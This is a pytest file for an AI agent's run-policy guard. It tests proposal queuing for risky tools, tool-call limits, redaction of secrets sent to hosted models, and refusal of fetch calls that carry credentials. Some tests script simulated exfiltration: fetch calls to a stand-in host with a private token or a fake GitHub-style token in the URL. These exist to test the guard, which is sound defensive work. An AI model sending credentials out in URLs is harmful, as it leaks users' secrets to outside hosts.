from fakes import Scripted
from langchain_core.messages import AIMessage, HumanMessage
from langchain_core.tools import tool

from hi.agents.base import make_agent
from hi.core.runpolicy import INTERACTIVE, UNATTENDED, run_scope
from hi.memory import proposals


def call(name, args=None, id="c1"):
    return AIMessage("", tool_calls=[{"name": name, "args": args or {}, "id": id}])


def run(tools, script, policy=None, origin="heartbeat"):
    """Run an agent over `script`; returns (final answer, run state or None)."""
    agent = make_agent(Scripted(messages=iter(script)), tools)
    if policy is None:
        return agent.invoke({"messages": [HumanMessage("go")]})["messages"][-1].content, None
    with run_scope(policy, origin) as state:
        return agent.invoke({"messages": [HumanMessage("go")]})["messages"][-1].content, state


def make_tools():
    ran = []

    @tool
    def send_email(to: str) -> str:
        """Send an email."""
        ran.append(("send_email", to))
        return "sent"

    @tool
    def read_note(path: str) -> str:
        """Read a note."""
        ran.append(("read_note", path))
        return "contents"

    return ran, send_email, read_note


def test_an_interactive_turn_runs_every_tool_unchanged(tmp_vault):
    ran, send_email, _ = make_tools()
    answer, _ = run([send_email], [call("send_email", {"to": "a"}), AIMessage("done")])
    assert ran == [("send_email", "a")] and answer == "done"
    assert proposals.pending() == []


def test_an_interactive_policy_is_not_guarded(tmp_vault):
    ran, send_email, _ = make_tools()
    run([send_email], [call("send_email", {"to": "a"}), AIMessage("done")], policy=INTERACTIVE, origin="ui")
    assert ran == [("send_email", "a")]


def test_an_unattended_run_turns_a_risky_tool_into_a_proposal(tmp_vault):
    ran, send_email, _ = make_tools()
    answer, state = run([send_email], [call("send_email", {"to": "bob@acme.com"}), AIMessage("queued it")], UNATTENDED)
    assert ran == []  # the tool never ran
    assert answer == "queued it"
    (p,) = proposals.pending()
    assert p["tool"] == "send_email" and p["args"] == {"to": "bob@acme.com"} and p["origin"] == "heartbeat"
    assert state.proposals == [p["id"]]


def test_an_unattended_run_may_use_read_only_tools(tmp_vault):
    ran, _, read_note = make_tools()
    run([read_note], [call("read_note", {"path": "a.md"}), AIMessage("ok")], UNATTENDED)
    assert ran == [("read_note", "a.md")] and proposals.pending() == []


def test_a_tool_the_policy_allows_explicitly_runs(tmp_vault):
    ran, send_email, _ = make_tools()
    run([send_email], [call("send_email", {"to": "a"}), AIMessage("ok")], UNATTENDED.with_allowed(["send_email"]))
    assert ran == [("send_email", "a")] and proposals.pending() == []


def test_the_tool_call_limit_stops_a_runaway_run(tmp_vault):
    ran, _, read_note = make_tools()
    script = [call("read_note", {"path": str(i)}, id=f"c{i}") for i in range(5)] + [AIMessage("stopped")]
    answer, state = run([read_note], script, UNATTENDED.__class__(**{**UNATTENDED.__dict__, "max_tool_calls": 2}))
    assert len(ran) == 2 and answer == "stopped"


def test_web_and_screen_tools_are_refused_when_the_run_may_not_use_them(tmp_vault):
    ran = []

    @tool
    def web_search(query: str) -> str:
        """Search."""
        ran.append(query)
        return "results"

    @tool
    def read_screen() -> str:
        """Screen."""
        ran.append("screen")
        return "text"

    no_web = UNATTENDED.__class__(**{**UNATTENDED.__dict__, "allow_web": False})
    run([web_search, read_screen], [call("web_search", {"query": "x"}), call("read_screen", id="c2"), AIMessage("ok")], no_web)
    assert ran == []  # neither ran, and neither became a proposal
    assert proposals.pending() == []


def test_an_mcp_tool_marked_read_only_may_run(tmp_vault):
    ran = []

    @tool
    def lookup_thing(q: str) -> str:
        """A read-only MCP tool."""
        ran.append(q)
        return "found"

    lookup_thing.metadata = {"readOnlyHint": True}  # how langchain-mcp-adapters carries a server's annotations
    run([lookup_thing], [call("lookup_thing", {"q": "a"}), AIMessage("ok")], UNATTENDED)
    assert ran == ["a"]


# --- what leaves the machine --------------------------------------------------------------------------------------

TOKEN = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"


class Spy(Scripted):
    """A scripted model that remembers the text it was sent, and can pretend to be hosted."""

    seen: list = []
    model: str = "gemma4:e4b"

    def _next(self):
        return super()._next()

    def _stream(self, messages, *a, **kw):
        self.seen.append("\n".join(str(m.content) for m in messages))
        yield from super()._stream(messages, *a, **kw)

    def _generate(self, messages, *a, **kw):
        self.seen.append("\n".join(str(m.content) for m in messages))
        return super()._generate(messages, *a, **kw)


def spy_run(model_name, policy, system_prompt="vault says: " + TOKEN):
    model = Spy(messages=iter([AIMessage("done")]), seen=[], model=model_name)
    agent = make_agent(model, [], system_prompt=system_prompt)
    if policy is None:
        agent.invoke({"messages": [HumanMessage("my token is " + TOKEN)]})
    else:
        with run_scope(policy, "schedule"):
            agent.invoke({"messages": [HumanMessage("my token is " + TOKEN)]})
    return "\n".join(model.seen)


def test_an_unattended_run_to_a_hosted_model_is_redacted_including_the_system_prompt():
    sent = spy_run("nemotron-3-ultra:cloud", UNATTENDED)
    assert TOKEN not in sent and "[redacted]" in sent


def test_an_unattended_run_to_a_local_model_is_not_changed():
    assert TOKEN in spy_run("gemma4:e4b", UNATTENDED)


def test_your_own_chat_with_a_hosted_model_is_not_changed():
    assert TOKEN in spy_run("nemotron-3-ultra:cloud", None)


def make_fetch():
    ran = []

    @tool
    def fetch(url: str) -> str:
        """Fetch a URL."""
        ran.append(url)
        return "page"

    return ran, fetch


def test_a_fetch_url_with_one_of_your_credentials_is_refused_everywhere(monkeypatch):
    import hi.config as config

    monkeypatch.setattr(config, "HOST_BRIDGE_TOKEN", "a-very-private-bridge-token")
    ran, fetch = make_fetch()
    for policy in (None, UNATTENDED):
        run([fetch], [call("fetch", {"url": "https://x.test/?k=a-very-private-bridge-token"}), AIMessage("ok")], policy)
    assert ran == []


def test_a_token_shaped_url_is_refused_only_in_an_unattended_run(tmp_vault):
    ran, fetch = make_fetch()
    url = f"https://x.test/?token={TOKEN}"
    run([fetch], [call("fetch", {"url": url}), AIMessage("ok")], None)
    assert ran == [url]  # you may paste your own signed link
    ran.clear()
    run([fetch], [call("fetch", {"url": url}), AIMessage("ok")], UNATTENDED.with_allowed(["fetch"]))
    assert ran == []


def test_a_normal_fetch_is_untouched(tmp_vault):
    ran, fetch = make_fetch()
    run([fetch], [call("fetch", {"url": "https://docs.python.org/3/"}), AIMessage("ok")], UNATTENDED)
    assert ran == ["https://docs.python.org/3/"]
